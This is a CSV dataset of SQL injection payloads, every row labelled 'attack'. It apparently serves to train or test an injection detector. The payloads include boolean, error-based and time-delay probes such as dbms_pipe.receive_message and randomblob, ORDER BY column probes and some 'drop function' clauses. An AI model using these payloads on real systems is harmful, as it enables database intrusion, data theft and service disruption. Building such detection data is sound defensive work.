label,payload,family
attack,1'   )    )    as gfzb where 7904  =  7904,other
attack,select   (  case when   (  4690  =  4373  )   then 4690 else 1/  (  select 0  )   end  )  --,other
attack,select   (  case when   (  7005  =  7118  )   then 1 else 7005*  (  select 7005 from master..sysdatabases  )   end  )  --,other
attack,1  )   as sdnd where 9472  =  9472,other
attack,select   (  case when   (  5768  =  9169  )   then 5768 else 1/  (  select 0  )   end  )  --,other
attack, (  select   (  case when   (  8130  =  5894  )   then 8130 else 8130*  (  select 8130 from information_schema.character_sets  )   end   )    ) ,other
attack,1'||  (  select 'uedk' where 4655  =  4655,other
attack,select   (  case when   (  1291  =  6612  )   then 1 else 1291*  (  select 1291 from master..sysdatabases  )   end  )  --,other
attack,-4761 order by 1--,other
attack,1  )   where 4479  =  4479 rlike   (  select   (  case when   (  6351  =  4367  )   then 1 else 0x28 end   )    )   --,other
attack,"select * from generate_series  (  2317,2317,case when   (  2317  =  9706  )   then 1 else 0 end  )   limit 1--",other
attack,"select * from generate_series  (  3427,3427,case when   (  3427  =  7516  )   then 1 else 0 end  )   limit 1--",other
attack,select case when 7649  =  9297 then 1 else null end--,other
attack,1  )   as tbve where 4828  =  4828,other
attack,1'+  (  select iwbs where 4939  =  4939,other
attack,1'  )   as fksm where 9714  =  9714,other
attack,1  )   as drgs where 1989  =  1989 order by 1--,other
attack,1'||  (  select 'eyiy' from dual where 8127  =  8127,other
attack,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   # lchh",other
attack,1'   )    )    as yqek where 1957  =  1957,other
attack,1  )   as hggi where 6511  =  6511,other
attack,"1""  )   where 1607  =  1607",other
attack,-1564'  )   order by 1--,other
attack,"1"" where 8333  =  8333",other
attack,if  (  6745  =  4078  )   select 6745 else drop function ytyt--,other
attack,"1"" where 9341  =  9341",other
attack,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ||'",other
attack,select   (  case when   (  8978  =  1426  )   then 1 else 8978*  (  select 8978 from master..sysdatabases  )   end  )  --,other
attack,1  )   where 4573  =  4573,other
attack,"1,  (  case when 8260  =  8260 then 1 else null end  )  ",other
attack,"  (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",other
attack,1'+  (  select 'dpun' where 4760  =  4760,other
attack,1'+  (  select tart where 9861  =  9861,other
attack,1  )   where 7729  =  7729,other
attack,"1   )    )    as zdbj where 2300  =  2300   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",other
attack,1  )   as qkkm where 8461  =  8461,other
attack,1'||  (  select 'dajl' from dual where 8440  =  8440,other
attack,1'   )    )    as cjjm where 1981  =  1981,other
attack,"1""  )   where 3507  =  3507",other
attack,select   (  case when   (  7980  =  3703  )   then 7980 else 7980*  (  select 7980 from information_schema.character_sets  )   end  )  #,other
attack,1' where 2911  =  2911,other
attack,-8523  )   as hzqs where 8944  =  8944 order by 1--,other
attack,"1""  )   where 9570  =  9570 rlike   (  select   (  case when   (  1642  =  3686  )   then 1 else 0x28 end   )    )   --",other
attack,1'  )   as mwpp where 6192  =  6192,other
attack,1'  )   as pudv where 2609  =  2609,other
attack,1'+  (  select zpdf where 2938  =  2938,other
attack,select   (  case when   (  5796  =  8326  )   then 5796 else 5796*  (  select 5796 from information_schema.character_sets  )   end  )  #,other
attack,"1""   )    )    as dksq where 7161  =  7161",other
attack,"1%""",other
attack,"1""  )   as lvbm where 8179  =  8179",other
attack,1'   )    )    as yyud where 4934  =  4934,other
attack,1 where 6827  =  6827,other
attack,"1""   )    )    as ynuw where 9138  =  9138",other
attack,"1' where 6147  =  6147   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",other
attack,select case when 5433  =  6458 then 1 else null end--,other
attack,select   (  case when   (  4636  =  1108  )   then 1 else 4636*  (  select 4636 from master..sysdatabases  )   end  )  --,other
attack,"-8382""   )    )    order by 1--",other
attack,1   )    )    as izvy where 2569  =  2569,other
attack,1'+  (  select qydm where 6019  =  6019,other
attack,1  ) ,other
attack,"make_set  (  2672  =  2672,5440  )  ",other
attack,1'||  (  select 'aojt' from dual where 8499  =  8499,other
attack,"1"" where 7796  =  7796",other
attack,1   )    )    as bjxd where 4299  =  4299,other
attack,1'  )   where 9817  =  9817,other
attack,1'||  (  select 'pmpd' where 9803  =  9803,other
attack,-5432'  )   as dndq where 9633  =  9633 order by 1#,other
attack,1 where 8095  =  8095,other
attack,1  )   where 2010  =  2010,other
attack,1'   )    )    as qaki where 5272  =  5272,other
attack,1'||  (  select 'bqhi' from dual where 7409  =  7409,other
attack,1'   )    )    as tley where 3539  =  3539,other
attack,"  (  select   (  case when   (  3531  =  3531  )   then   (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   else 3531 end   )    )   ",other
attack,select   (  case when   (  4205  =  9574  )   then 4205 else 1/  (  select 0  )   end  )  --,other
attack,-3359' order by 1--,other
attack,"-6618""   )    )     )   order by 1#",other
attack,"1',  (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  9693  =  9693,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",other
attack,1' where 5060  =  5060,other
attack,1 where 1015  =  1015,other
attack,"  (  select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ",other
attack,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null   )    )   ||'",other
attack,1 where 9774  =  9774,other
attack,1  )   as ilqx where 8547  =  8547,other
attack,select   (  case when   (  7852  =  7476  )   then 7852 else 7852*  (  select 7852 from mysql.db  )   end  )  #,other
attack,select   (  case when   (  5752  =  6036  )   then 1 else 5752*  (  select 5752 from master..sysdatabases  )   end  )  --,other
attack,1'||  (  select 'sbft' where 8748  =  8748,other
attack,"1"" where 8089  =  8089",other
attack,1'||  (  select 'boib' where 9595  =  9595,other
attack,if  (  8264  =  1939  )   select 8264 else drop function nsoq--,other
attack,1'  )   where 8204  =  8204,other
attack,"1""   )    )    as riui where 2605  =  2605",other
attack,select case when 3661  =  9315 then 1 else null end--,other
attack,"1"" where 4298  =  4298 order by 1--",other
attack,"1""   )    )    as azak where 4911  =  4911",other
attack,"1""  )   as ymto where 3453  =  3453",other
attack,-3578'   )    )     )   order by 1--,other
attack,"1,  (  case when 6620  =  3092 then 1 else null end  )  ",other
attack,select   (  case when   (  2676  =  4191  )   then 2676 else 1/  (  select 0  )   end  )  --,other
attack,"select * from generate_series  (  9863,9863,case when   (  9863  =  3285  )   then 1 else 0 end  )   limit 1--",other
attack,"-5591%""   )    )    order by 1--",other
attack,1'  )   where 4949  =  4949,other
attack,"1""   )    )    as sqow where 8752  =  8752",other
attack,"1""  )   as frmp where 6073  =  6073",other
attack,select   (  case when   (  3716  =  4021  )   then 3716 else 3716*  (  select 3716 from information_schema.character_sets  )   end  )  #,other
attack,1' where 5103  =  5103,other
attack,1  )   where 7096  =  7096,other
attack,1 where 4787  =  4787,other
attack,1'||  (  select 'ydvg' from dual where 7108  =  7108,other
attack,1'||  (  select 'adoe' from dual where 7662  =  7662,other
attack,1'+  (  select pagd where 2484  =  2484,other
attack,"1',  (  select   (  case when   (  8382  =  8382  )   then 1 else 1/  (  select 0  )   end   )    )   ",other
attack,1   )    )    as cwyb where 3633  =  3633,other
attack,1' in boolean mode  )   order by 1#,other
attack,"iif  (  5214  =  7412,1,1/0  )  ",other
attack,1'||  (  select 'rhcv' where 6228  =  6228,other
attack,-7404' where 1536  =  1536 order by 1#,other
attack,1'  )   as rhvm where 1420  =  1420,other
attack,"1,  (  select   (  case when   (  9644  =  9644  )   then dbms_pipe.receive_message  (  chr  (  75  )  ||chr  (  78  )  ||chr  (  104  )  ||chr  (  98  )  ,5  )   else 1/  (  select 0 from dual  )   end  )   from dual  )  ",other
attack,1'   )    )    as xcvg where 1157  =  1157 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,other
attack,"1""  )   as pobe where 1704  =  1704",other
attack,-8641%' order by 1--,other
attack,if  (  7899  =  7899  )   select 7899 else drop function zbbp--,other
attack,"1,iif  (  6625  =  6625,1,1/0  )  ",other
attack,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3",other
attack,"select count  (  *  )   from generate_series  (  1,5000000   )    )   ||'",other
attack,"select * from generate_series  (  7610,7610,case when   (  7610  =  9416  )   then 1 else 0 end  )   limit 1--",other
attack,1'||  (  select 'znba' where 8323  =  8323,other
attack,select   (  case when   (  2350  =  8682  )   then 2350 else 1/  (  select 0  )   end  )  --,other
attack,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4# ljph",other
attack,"iif  (  2869  =  9448,1,1/0  )  ",other
attack,1'   )    )    as dqby where 9256  =  9256,other
attack,select   (  case when   (  6276  =  6276  )   then 6276 else 6276*  (  select 6276 from information_schema.character_sets  )   end  )  #,other
attack,1   )    )    as xyuy where 6894  =  6894,other
attack,1'  )   as fxid where 5926  =  5926,other
attack,1'||  (  select 'ezse' from dual where 3821  =  3821,other
attack,1'   )    )     )   order by 1--,other
attack,"1""   )    )    as cduw where 4495  =  4495",other
attack,1'   )    )    as gchn where 5856  =  5856,other
attack,"select * from generate_series  (  5846,5846,case when   (  5846  =  5227  )   then 1 else 0 end  )   limit 1--",other
attack,1   )    )    as zoso where 3633  =  3633,other
attack,1'  )   as scnn where 9274  =  9274,other
attack,1' where 4115  =  4115,other
attack,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual-- vykx",other
attack,1'||  (  select 'xtcb' where 5240  =  5240,other
attack, (  select   (  case when   (  7018  =  7018  )   then 7018 else 7018*  (  select 7018 from master..sysdatabases  )   end   )    ) ,other
attack,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )  ",other
attack,"1""  )   where 5065  =  5065",other
attack,1  )   as tykp where 6851  =  6851,other
attack,1'||  (  select 'ozoj' where 1608  =  1608,other
attack,1  )   as fhvb where 4008  =  4008,other
attack,"-9054""  )   as rgyu where 3792  =  3792 order by 1--",other
attack,1  )   as vqdh where 1603  =  1603,other
attack,"1"" where 5250  =  5250",other
attack,1  )   where 8094  =  8094,other
attack,if  (  8574  =  7534  )   select 8574 else drop function nxbe--,other
attack,1' where 3362  =  3362,other
attack, (  select   (  case when   (  3950  =  2747  )   then 1 else 1/  (  select 0  )   end   )    ) ,other
attack,select   (  case when   (  4755  =  4784  )   then 1 else 4755*  (  select 4755 from master..sysdatabases  )   end  )  --,other
attack,1'+  (  select 'vjoj' where 5348  =  5348,other
attack,1   )    )    as vryv where 5600  =  5600,other
attack,1 where 3502  =  3502 order by 1--,other
attack,"1""",other
attack,1'+  (  select zwsr where 6567  =  6567,other
attack,"select count  (  *  )   from generate_series  (  1,5000000   )    )   +'",other
attack,1'+  (  select 'mdiu' where 4443  =  4443,other
attack,1'+  (  select 'wvqj' where 3709  =  3709,other
attack,1'+  (  select 'xpby' where 2724  =  2724,other
attack,if  (  7427  =  7800  )   select 7427 else drop function dgir--,other
attack,"iif  (  7953  =  3021,1,1/0  )  ",other
attack,"1"" where 7005  =  7005",other
attack,1  )   as fnpq where 5209  =  5209,other
attack,"1""   )    )     )   order by 1#",other
attack,1 where 8889  =  8889,other
attack,select   (  case when   (  3444  =  8424  )   then 3444 else 3444*  (  select 3444 from information_schema.character_sets  )   end  )  #,other
attack,"1,  (  select   (  case when   (  4828  =  2600  )   then 1 else 1/  (  select 0  )   end   )    )   ",other
attack,1'+  (  select qugu where 2287  =  2287 order by 1#,other
attack,1 where 5080  =  5080,other
attack,1'+  (  select 'phtz' where 3171  =  3171,other
attack,1   )    )    as oqui where 3368  =  3368 order by 1--,other
attack,"1'  )   as xagu where 9088  =  9088   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",other
attack,1  )   where 3381  =  3381,other
attack,1'+  (  select cxvy where 7421  =  7421,other
attack,-9389'  )   order by 1#,other
attack,"1""  )   where 3390  =  3390",other
attack,1%'  ) ,other
attack, (  select   (  case when   (  6035  =  9882  )   then 6035 else 6035*  (  select 6035 from mysql.db  )   end   )    ) ,other
attack,1'  )   as tsge where 6970  =  6970,other
attack,"1   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  -- huss",other
attack,"1""   )    )    as esho where 8864  =  8864 order by 1--",other
attack,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  +'",other
attack,end# ckxq,other
attack, (  select   (  case when   (  6838  =  2866  )   then 6838 else 1/  (  select 0  )   end   )    ) ,other
attack,1  )   where 1096  =  1096,other
attack,1'||  (  select 'awic' where 5227  =  5227,other
attack,select   (  case when   (  3325  =  1767  )   then 3325 else 3325*  (  select 3325 from mysql.db  )   end  )  #,other
attack,"1"" where 2483  =  2483",other
attack,1'  )   where 2120  =  2120,other
attack,"iif  (  1878  =  2513,1,1/0  )  ",other
attack,select   (  case when   (  3672  =  8360  )   then 3672 else 3672*  (  select 3672 from information_schema.character_sets  )   end  )  #,other
attack,1 where 1092  =  1092,other
attack,1'  )   where 9538  =  9538,other
attack,1'||  (  select 'mosp' where 6085  =  6085,other
attack,select case when 2930  =  7964 then 1 else null end--,other
attack,select case when 6555  =  7349 then 1 else null end--,other
attack,1'||  (  select 'hafu' where 6226  =  6226,other
attack,1'  )   where 2852  =  2852,other
attack,1   )    )    as svhd where 9761  =  9761,other
attack,"1'  )   as bagi where 1281  =  1281   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",other
attack,1'   )    )    as vrwr where 3830  =  3830,other
attack,"1""  )   where 1833  =  1833",other
attack,"iif  (  4436  =  8910,1,1/0  )  ",other
attack,select   (  case when   (  3336  =  9781  )   then 3336 else 1/  (  select 0  )   end  )  --,other
attack,select   (  case when   (  8350  =  7872  )   then 8350 else 8350*  (  select 8350 from information_schema.character_sets  )   end  )  #,other
attack,"1"" where 2886  =  2886",other
attack,"1""  )   where 8612  =  8612",other
attack,-4947' order by 1#,other
attack,"1"" where 6023  =  6023",other
attack,1  )   as wiyx where 6515  =  6515,other
attack,"1"" where 4672  =  4672",other
attack,1  )   where 6035  =  6035,other
attack,1'||  (  select 'ucxp' where 6612  =  6612 order by 1--,other
attack, (  select   (  case when   (  6783  =  6783  )   then 1 else 1/  (  select 0  )   end   )    ) ,other
attack,1'   )    )    as lkse where 9951  =  9951,other
attack,1'  )   as tvqn where 2967  =  2967,other
attack,select   (  case when   (  6435  =  8988  )   then 6435 else 6435*  (  select 6435 from information_schema.character_sets  )   end  )  #,other
attack,"1%""   )    )     )   order by 1--",other
attack,1'  )   as hwpf where 5603  =  5603,other
attack,if  (  4135  =  2165  )   select 4135 else drop function otyy--,other
attack,1  )   as vxsh where 4706  =  4706,other
attack,"select * from generate_series  (  7494,7494,case when   (  7494  =  7854  )   then 1 else 0 end  )   limit 1--",other
attack,if  (  2695  =  9045  )   select 2695 else drop function qmno--,other
attack,1'  )   where 5214  =  5214,other
attack,select   (  case when   (  5203  =  6330  )   then 5203 else 5203*  (  select 5203 from mysql.db  )   end  )  #,other
attack,1'||  (  select 'lmsc' from dual where 1162  =  1162 order by 1--,other
attack,"-6357""  )   order by 1--",other
attack,1'+  (  select rhlb where 9477  =  9477,other
attack,1'+  (  select 'rkap' where 9692  =  9692,other
attack,1  )   as nxmd where 8650  =  8650,other
attack,"elt  (  5098  =  2728,1  )  ",other
attack,"1""   )    )    as bosq where 4695  =  4695",other
attack,if  (  3593  =  3779  )   select 3593 else drop function qtqy--,other
attack,if  (  8995  =  9787  )   select 8995 else drop function ofgg--,other
attack,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  +'",other
attack,if  (  9690  =  6491  )   select 9690 else drop function nyln--,other
attack,1'+  (  select zmbu where 8685  =  8685 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )     )  +',other
attack,1 where 4949  =  4949,other
attack,"iif  (  7011  =  2522,1,1/0  )  ",other
attack,"1' where 3125  =  3125   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",other
attack,1'||  (  select 'kptj' from dual where 5123  =  5123,other
attack,"1,  (  select   (  case when   (  5726  =  5275  )   then 1 else 1/  (  select 0  )   end   )    )   ",other
attack,5739-5738,other
attack,select   (  case when   (  7033  =  1594  )   then 7033 else 7033*  (  select 7033 from information_schema.character_sets  )   end  )  #,other
attack,"1""   )    )    as nejd where 2885  =  2885",other
attack,"1"" where 7022  =  7022",other
attack,select case when 2948  =  7279 then 1 else null end--,other
attack,"1""   )    )    as jrld where 3488  =  3488",other
attack,1  )   as jdhz where 2021  =  2021,other
attack,1'   )    )    as bbdf where 1327  =  1327,other
attack,"iif  (  5571  =  4947,1,1/0  )  ",other
attack,"select * from generate_series  (  9167,9167,case when   (  9167  =  2273  )   then 1 else 0 end  )   limit 1--",other
attack,1'  )   where 9516  =  9516,other
attack,1   )    )    as wajy where 8593  =  8593,other
attack,-8404   )    )    order by 1--,other
attack,"  (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",other
attack,1'  )   as sagj where 4558  =  4558,other
attack,1'   )    )    as qswu where 6377  =  6377,other
attack,select case when 5894  =  4052 then 1 else null end--,other
attack,1  )   where 8041  =  8041,other
attack,1  )   as sglv where 7676  =  7676,other
attack,"iif  (  8770  =  9611,1,1/0  )  ",other
attack,1  )   as jtfx where 8038  =  8038,other
attack,1 where 7425  =  7425 rlike   (  select   (  case when   (  4056  =  3196  )   then 1 else 0x28 end   )    )   --,other
attack,1%'   )    )     )   order by 1--,other
attack, ) ,other
attack,"1,  (  select   (  case when   (  2970  =  5830  )   then 1 else 2970*  (  select 2970 from mysql.db  )   end   )    )   ",other
attack,"1   )    )    as bebl where 2597  =  2597   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",other
attack,1  )   where 3936  =  3936,other
attack,"1',  (  select   (  case when   (  6750  =  6750  )   then 1 else 6750*  (  select 6750 from information_schema.character_sets  )   end   )    )   ",other
attack,"-6595"" order by 1--",other
attack,1' where 5230  =  5230,other
attack,1'  )   as bzem where 4240  =  4240,other
attack,1 where 4519  =  4519,other
attack,"1""  )   where 2496  =  2496",other
attack,select   (  case when   (  3435  =  4011  )   then 1 else 3435*  (  select 3435 from master..sysdatabases  )   end  )  --,other
attack,"-9535"" order by 1--",other
attack,"1""  )   as awdg where 9512  =  9512",other
attack,1   )    )    as epfz where 5471  =  5471,other
attack,if  (  6842  =  5446  )   select 6842 else drop function vjfq--,other
attack,"1""  )   where 9621  =  9621",other
attack,"1"" where 1100  =  1100",other
attack,"1',  (  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4932  =  4932  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ",other
attack,1'  )   where 5307  =  5307,other
attack,1'+  (  select 'lcru' where 3215  =  3215,other
attack,"1""  )   as ktnq where 9005  =  9005",other
attack,1'  )   as uaoz where 2464  =  2464,other
attack,1' where 5335  =  5335,other
attack,select case when 5308  =  6745 then 1 else null end--,other
attack,select case when 9848  =  2618 then 1 else null end--,other
attack,1 where 7442  =  7442,other
attack,select   (  case when   (  9746  =  8055  )   then 9746 else 1/  (  select 0  )   end  )  --,other
attack,1'||  (  select 'dezl' where 8661  =  8661,other
attack,1' where 2145  =  2145,other
attack, (  select   (  case when   (  5792  =  5792  )   then 5792 else 1/  (  select 0  )   end   )    ) ,other
attack,1   )    )    order by 1--,other
attack,-6015%'  )   order by 1--,other
attack,1  )   where 9344  =  9344,other
attack,select   (  case when   (  4306  =  2815  )   then 4306 else 1/  (  select 0  )   end  )  --,other
attack,"1""  )   where 4951  =  4951",other
attack,1' where 6135  =  6135,other
attack,1%'   )    )    order by 1#,other
attack,1'   )    )    as dago where 9788  =  9788,other
attack,-8264%'  )   order by 1#,other
attack,select 'qqpjq'||  (  case 5118 when 5118 then 1 else 0 end  )  ||'qzvzq' from rdb$database,other
attack,"1"" where 7599  =  7599",other
attack,1'||  (  select 'yzdz' where 5021  =  5021,other
attack,"1,iif  (  7475  =  7475,1,1/0  )  ",other
attack,1  )   as pyjx where 9005  =  9005,other
attack,"1""   )    )    as vbdo where 3882  =  3882",other
attack,select 'qqpjq'||  (  select   (  case when   (  2933  =  2933  )   then 1 else 0 end   )    )   ||'qzvzq',other
attack,select   (  case when   (  7990  =  7627  )   then 7990 else 1/  (  select 0  )   end  )  --,other
attack,"1' in boolean mode  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  #",other
attack,"1,  (  select   (  case when   (  1255  =  8025  )   then 1 else 1255*  (  select 1255 from mysql.db  )   end   )    )   ",other
attack,-1217'   )    )     )   order by 1#,other
attack,"iif  (  2205  =  4764,1,1/0  )  ",other
attack,"select * from generate_series  (  3267,3267,case when   (  3267  =  5900  )   then 1 else 0 end  )   limit 1--",other
attack,1'+  (  select 'zugq' where 9218  =  9218,other
attack,"1"" where 7158  =  7158",other
attack,1 where 3735  =  3735,other
attack,select   (  case when   (  1005  =  5996  )   then 1 else 1005*  (  select 1005 from master..sysdatabases  )   end  )  --,other
attack,select   (  case when   (  4935  =  4734  )   then 4935 else 4935*  (  select 4935 from mysql.db  )   end  )  #,other
attack,1' where 9242  =  9242,other
attack,"  (  select 1 from generate_series  (  8515,8515,case when   (  8515  =  3477  )   then 1 else 0 end  )   limit 1  )  ",other
attack,select case when 5346  =  8272 then 1 else null end--,other
attack,1'  )   as imgv where 7802  =  7802,other
attack,"1""   )    )    as irrz where 8730  =  8730 order by 1#",other
attack,"1""  )   as cysq where 5258  =  5258",other
attack,select case when 1238  =  9044 then 1 else null end--,other
attack,select   (  case when   (  7385  =  8723  )   then 7385 else 7385*  (  select 7385 from information_schema.character_sets  )   end  )  #,other
attack,1   )    )    as ogcv where 4396  =  4396,other
attack,"1""  )   as vqkz where 8536  =  8536",other
attack,1 where 4940  =  4940,other
attack,select   (  case when   (  5914  =  2314  )   then 5914 else 1/  (  select 0  )   end  )  --,other
attack,1'  )   where 8118  =  8118,other
attack,"iif  (  9007  =  3836,1,1/0  )  ",other
attack,"select * from generate_series  (  7237,7237,case when   (  7237  =  9757  )   then 1 else 0 end  )   limit 1--",other
attack,1 where 4245  =  4245,other
attack,1   )    )    as xlww where 5844  =  5844,other
attack,"1%""  )   order by 1--",other
attack,1  )   order by 1#,other
attack,1  )   where 2170  =  2170,other
attack,if  (  6554  =  1534  )   select 6554 else drop function buqb--,other
attack,"1""  )   where 4112  =  4112",other
attack,"1""  )   where 1300  =  1300 order by 1#",other
attack,"select * from generate_series  (  1488,1488,case when   (  1488  =  1685  )   then 1 else 0 end  )   limit 1--",other
attack,"1"" where 9756  =  9756",other
attack,"1""  )   where 7514  =  7514",other
attack,"1,  (  select   (  case when   (  8392  =  8404  )   then 1 else 8392*  (  select 8392 from information_schema.character_sets  )   end   )    )   ",other
attack,1'||  (  select 'yydv' from dual where 9639  =  9639,other
attack,1'+  (  select ankx where 6789  =  6789,other
attack,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3#",other
attack,1' where 9381  =  9381,other
attack,"1%""   )    )    order by 1#",other
attack,1'  )   where 4003  =  4003,other
attack,1'+  (  select xwcl where 7997  =  7997,other
attack,1'+  (  select 'ggkm' where 3394  =  3394,other
attack,"iif  (  2976  =  2976,1,1/0  )  ",other
attack,"1""  )   as nfpe where 2679  =  2679",other
attack,select   (  case when   (  8233  =  1074  )   then 8233 else 1/  (  select 0  )   end  )  --,other
attack,"1""  )   as hsws where 6656  =  6656",other
attack,-8023' in boolean mode  )   order by 1#,other
attack,1' where 6583  =  6583,other
attack,select   (  case when   (  9030  =  9185  )   then 9030 else 9030*  (  select 9030 from information_schema.character_sets  )   end  )  #,other
attack,1'||  (  select 'bupa' from dual where 8548  =  8548,other
attack,"select * from generate_series  (  3827,3827,case when   (  3827  =  7095  )   then 1 else 0 end  )   limit 1--",other
attack,1 where 6434  =  6434,other
attack,"1""   )    )    as exzo where 7518  =  7518   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",other
attack,"1""  )   as nyzd where 5305  =  5305",other
attack,select case when 3819  =  1887 then 1 else null end--,other
attack,-6984 order by 1#,other
attack,"1%"" order by 1#",other
attack,1  )   where 9160  =  9160,other
attack,1 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   # mekk,other
attack,1   )    )    as jvvs where 9594  =  9594,other
attack,1'+  (  select 'supo' where 8691  =  8691,other
attack,1  )   as wshv where 5684  =  5684,other
attack,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )  # huhw",other
attack,"make_set  (  6174  =  9734,1  )  ",other
attack,1'||  (  select 'ussi' where 8958  =  8958,other
attack,"1"" where 7110  =  7110",other
attack,1'||  (  select 'ywjy' where 7579  =  7579,other
attack,1   )    )    as syot where 1199  =  1199,other
attack,"iif  (  1095  =  2853,1,1/0  )  ",other
attack,select   (  case when   (  4719  =  8852  )   then 1 else 4719*  (  select 4719 from master..sysdatabases  )   end  )  --,other
attack,1'  )   order by 1--,other
attack,-1866'   )    )    as cwtv where 3295  =  3295 order by 1--,other
attack,1'  )   as xwlf where 9424  =  9424,other
attack,"1""  )   where 8657  =  8657",other
